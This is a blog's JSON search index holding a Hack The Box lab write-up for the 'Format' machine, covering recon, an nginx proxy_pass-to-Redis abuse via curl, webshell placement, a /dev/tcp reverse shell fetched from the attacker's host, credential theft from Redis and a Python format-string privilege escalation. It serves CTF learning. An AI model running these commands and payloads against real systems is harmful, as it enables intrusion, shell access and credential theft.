
[{"content":"","date":"6 October 2023","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"6 October 2023","externalUrl":null,"permalink":"/categories/hack-the-box/","section":"Categories","summary":"","title":"Hack the Box","type":"categories"},{"content":"","date":"6 October 2023","externalUrl":null,"permalink":"/tags/htb-format/","section":"Tags","summary":"","title":"HTB Format","type":"tags"},{"content":"Format runs a simple open-source microblogging platform. To acquire unauthorized read and write access to the server, I\u0026rsquo;ll use post creation techniques. This, together with a proxy_pass flaw, allows me to control Redis, allowing my account \u0026ldquo;pro\u0026rdquo; rights. With this improved status, I obtain access to a writable directory where I can install a webshell and gain a foothold on the server. I take shared credentials from the Redis database to improve my access. Finally, to gain root access, I attack a format string flaw in a Python script, exposing the secret.\nRecon # nmap found three open TCP ports: 22, 80, and 3000.\n❯ nmap -sT -sC -sV -p- -T4 -oN nmap.txt 10.10.11.213 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 19:58 WIB Nmap scan report for 10.10.11.213 (10.10.11.213) Host is up (0.028s latency). Not shown: 65532 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45💿f2:0b:05:4f (RSA) | 256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA) |_ 256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519) 80/tcp open http nginx 1.18.0 |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: nginx/1.18.0 3000/tcp open http nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Did not follow redirect to http://microblog.htb:3000/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.39 seconds From the nmap output, the http service at port 3000 is redirecting to microblog.htb. The http service at port 80 is redirecting to app.microblog.htb.\n❯ curl 10.10.11.213 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Refresh\u0026#34; content=\u0026#34;0; url=\u0026#39;http://app.microblog.htb\u0026#39;\u0026#34; /\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Let\u0026rsquo;s add these to /etc/hosts.\nEnumeration # TCP 80 (HTTP) - app.microblog.htb # When visiting port 80, I encounter a functional website. This website allows me to register, log in, and create a blog with any subdomain. There\u0026rsquo;s a pro user offers, but it says Sorry, pro licenses being developed. Please check back soon!. Let\u0026rsquo;s enumerate further.\nDirectory brute force yields no interesting results. At the bottom of the website there is a Contribute Here! link that points to http://microblog.htb:3000/cooper/microblog.\nTCP 3000 (HTTP) - microblog.htb # After clicking the previous link, I am directed to a Gitea service that serves a microblog repository. This repository appears to contain the source code for app.microblog.htb. Let\u0026rsquo;s clone this repository and perform some analysis.\nAfter some time of analysis, I learned that there\u0026rsquo;s file read and write vulnerability at POST id data. The file read vulnerability is caused by appending the POST id to order.txt and every line in order.txt will be passed to file_get_contents() when the page load. The file write vulnerability occurs when the path from the POST id is passed to fwrite() along the content from $html which originates from either POST txt or POST header.\nThis website utilizes a Redis database by connecting to a Unix socket at /var/run/redis/redis.sock and by default when registering a new user, pro is set to false\npro users have write access to /var/www/microblog/\u0026lt;blogname\u0026gt;/uploads/. If I can get the pro access, I can place a web shell to this directory.\nLet\u0026rsquo;s use the file read vulnerability to find a information that can make a regular user become pro user.\nFirst, create an account and create a blog. Then, add the blog to /etc/hosts. I\u0026rsquo;ll use the file read vulnerability in the txt section because it has more space. Because this website uses nginx, let\u0026rsquo;s try to read nginx configuration file at /etc/nginx/sites-available/default\n/etc/nginx/sites-available/default:\nserver { listen 80; listen [::]:80; root /var/www/microblog/app; index index.html index.htm index-nginx-debian.html; server_name microblog.htb; location / { return 404; } location = /static/css/health/ { resolver 127.0.0.1; proxy_pass http://css.microbucket.htb/health.txt; } location = /static/js/health/ { resolver 127.0.0.1; proxy_pass http://js.microbucket.htb/health.txt; } location ~ /static/(.*)/(.*) { resolver 127.0.0.1; proxy_pass http://$1.microbucket.htb/$2; } } There is a misconfiguration at this part:\nlocation ~ /static/(.*)/(.*) { resolver 127.0.0.1; proxy_pass http://$1.microbucket.htb/$2; } The proxy_pass feature in Nginx supports proxying requests to local unix sockets. Surprisingly, the URI passed to proxy_pass can be either http:// or a UNIX-domain socket path specified after the word unix and enclosed in colons. With this feature, we can change the user pro field to true by sending HSET method to http://microblog.htb/static/unix:/var/run/redis/redis.sock:\u0026lt;username\u0026gt;%20pro%20true%20/\n❯ curl -X \u0026#34;HSET\u0026#34; \u0026#39;http://microblog.htb/static/unix:/var/run/redis/redis.sock:gh0st%20pro%20true%20/\u0026#39; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;502 Bad Gateway\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt;\u0026lt;h1\u0026gt;502 Bad Gateway\u0026lt;/h1\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;hr\u0026gt;\u0026lt;center\u0026gt;nginx/1.18.0\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; We should not be bothered by the response, if we check the blog again, the current user should have pro access.\nWith the pro access, we can write a webshell to the /var/www/microblog/\u0026lt;blogname\u0026gt;/uploads/ directory because it\u0026rsquo;s writable for the pro user.\nI can\u0026rsquo;t execute a reverse shell directly from the webshell, so I serve the reverse shell payload externally and retrieve it from the webshell using curl.\n❯ cat rev.sh ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: rev.sh ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ #!/bin/bash 2 │ bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.24/9001 0\u0026gt;\u0026amp;1\u0026#39; ───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── ❯ python -m http.server 1337 Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ... ❯ nc -nvlp 9001 Listening on 0.0.0.0 9001 Connection received on 10.10.11.213 53386 bash: cannot set terminal process group (621): Inappropriate ioctl for device bash: no job control in this shell www-data@format:~/microblog/junk/uploads$ Horizontal Privilege Escalation # Let\u0026rsquo;s stabilize the shell.\nwww-data@format:~$ script /dev/null -c bash script /dev/null -c bash Script started, output log file is \u0026#39;/dev/null\u0026#39;. www-data@format:~$ ^Z [1]+ Stopped nc -nvlp 9001 ❯ stty raw -echo;fg;reset nc -nvlp 9001 www-data@format:~$ export TERM=xterm www-data@format:~$ stty rows 20 columns 189 Let\u0026rsquo;s take a look at the Redis database, there should be some useful information. We can use redis-cli to connect to the UNIX socket by specifying -s\nredis-cli -s /var/run/redis/redis.sock Let\u0026rsquo;s check the keys with KEYS * and dump all the value from the specific key with HGETALL key.\nredis /var/run/redis/redis.sock\u0026gt; KEYS * 1) \u0026#34;cooper.dooper:sites\u0026#34; 2) \u0026#34;cooper.dooper\u0026#34; redis /var/run/redis/redis.sock\u0026gt; HGETALL cooper.dooper 1) \u0026#34;username\u0026#34; 2) \u0026#34;cooper.dooper\u0026#34; 3) \u0026#34;password\u0026#34; 4) \u0026#34;zooperdoopercooper\u0026#34; 5) \u0026#34;first-name\u0026#34; 6) \u0026#34;Cooper\u0026#34; 7) \u0026#34;last-name\u0026#34; 8) \u0026#34;Dooper\u0026#34; 9) \u0026#34;pro\u0026#34; 10) \u0026#34;false\u0026#34; I\u0026rsquo;ve obtained a password, let\u0026rsquo;s use it to switch to the user cooper.\nwww-data@format:~$ su - cooper Password: cooper@format:~$ Indeed, we can use this password to switch to the user cooper and now we can retrieve the user flag.\ncooper@format:~$ cat user.txt b13339██████████████████████████ Vertical Privilege Escalation # This user has sudo permission on (root) /usr/bin/license.\ncooper@format:~$ sudo -l [sudo] password for cooper: Matching Defaults entries for cooper on format: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User cooper may run the following commands on format: (root) /usr/bin/license This program is a Python script, and everyone has read permission for this file. This program contains a secret that used to encrypt a license key.\nsecret = [line.strip() for line in open(\u0026#34;/root/license/secret\u0026#34;)][0] secret_encoded = secret.encode() salt = b\u0026#39;microblogsalt123\u0026#39; kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend()) encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded)) There\u0026rsquo;s a interesting part of the program that can be abuse to read this secret variable.\nclass License(): def __init__(self): chars = string.ascii_letters + string.digits + string.punctuation self.license = \u0026#39;\u0026#39;.join(random.choice(chars) for i in range(40)) self.created = date.today() ... l = License() ... prefix = \u0026#34;microblog\u0026#34; username = r.hget(args.provision, \u0026#34;username\u0026#34;).decode() firstlast = r.hget(args.provision, \u0026#34;first-name\u0026#34;).decode() + r.hget(args.provision, \u0026#34;last-name\u0026#34;).decode() license_key = (prefix + username + \u0026#34;{license.license}\u0026#34; + firstlast).format(license=l) This program accepts a Redis key that will be used to get the username,first-name, and last-name for creating the license key. Because I can control what the value is, I can use this format string {license.__init__.__globals__[secret-encoded]} to extract the secret value. Let\u0026rsquo;s create a new Redis key with the format string as the username.\nHSET gh0st username \u0026#34;{license.__init__.__globals__[secret_encoded]}\u0026#34; first-name first last-name last Let\u0026rsquo;s run the program with -p gh0st.\ncooper@format:~$ sudo /usr/bin/license -p gh0st Plaintext license key: ------------------------------------------------------ microblogb\u0026#39;unCR4ckaBL3Pa$$w0rd\u0026#39;b\u0026amp;g4:9rT8IAHUFqaOY=I_/Zm}!`CVrof~+\u0026amp;mH)\u0026gt;ffirstlast Encrypted license key (distribute to customer): ------------------------------------------------------ gAAAAABlIQd9-pcOI-kp6fFvdGY3vauby5-9pwtaQPKeQObVBUYWPqmqxrE8kWW7qr8DB-Tv5naNgYff9KHDZNoRUCHZnh51vM6vmrlfqgR5BCQOllVbi0mGv6W8NR7MsWIE8byJ9RfpihdzwyIa-nNx4DFQ9B_BIQgn_XdnRZcuNXoQw5TLKHImvAA70hq-_FCpfzjrvHEk There\u0026rsquo;s a interesting string unCR4ckaBL3Pa$$w0rd, this should be the secret value. Let\u0026rsquo;s use this value for switching to the root user.\ncooper@format:~$ su - root Password: root@format:~# cat root.txt 3f7ad4██████████████████████████ This indeed the root password and I can retrieve the root flag.\nIn wrapping up this writeup, I want to emphasize that I\u0026rsquo;m here to learn and grow alongside you. Your insights and feedback are an essential part of this journey, so please feel free to share your thoughts.\nResources # https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/ https://podalirius.net/en/articles/python-format-string-vulnerabilities/ ","date":"6 October 2023","externalUrl":null,"permalink":"/posts/htb/machines/format/","section":"Posts","summary":"Format runs a simple open-source microblogging platform.","title":"HTB: Format","type":"posts"},{"content":"","date":"6 October 2023","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"6 October 2023","externalUrl":null,"permalink":"/categories/linux/","section":"Categories","summary":"","title":"Linux","type":"categories"},{"content":"","date":"6 October 2023","externalUrl":null,"permalink":"/categories/medium/","section":"Categories","summary":"","title":"Medium","type":"categories"},{"content":"","date":"6 October 2023","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"6 October 2023","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" ","date":"6 October 2023","externalUrl":null,"permalink":"/","section":"Welcome to my blog","summary":" ","title":"Welcome to my blog","type":"page"},{"content":" About Me # I\u0026rsquo;m just a boy who has an insatiable thirst for knowledge and enjoys learning new things every day. Solving CTF challenges and pwning HackTheBox machines are among my favorite ways to expand my skillset and enhance my abilities in the field. Keeping up with the latest technologies, trends, and threats in the digital world is something I\u0026rsquo;m deeply passionate about. Through my expertise in identifying vulnerabilities and implementing effective solutions, I do my best to contribute to making the digital world a safer place. I\u0026rsquo;m grateful for every opportunity to learn and grow in this dynamic field, and I\u0026rsquo;m eager to see what the future holds.\n","date":"1 January 0001","externalUrl":null,"permalink":"/about/","section":"Welcome to my blog","summary":"About Me # I\u0026rsquo;m just a boy who has an insatiable thirst for knowledge and enjoys learning new things every day.","title":"About","type":"page"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]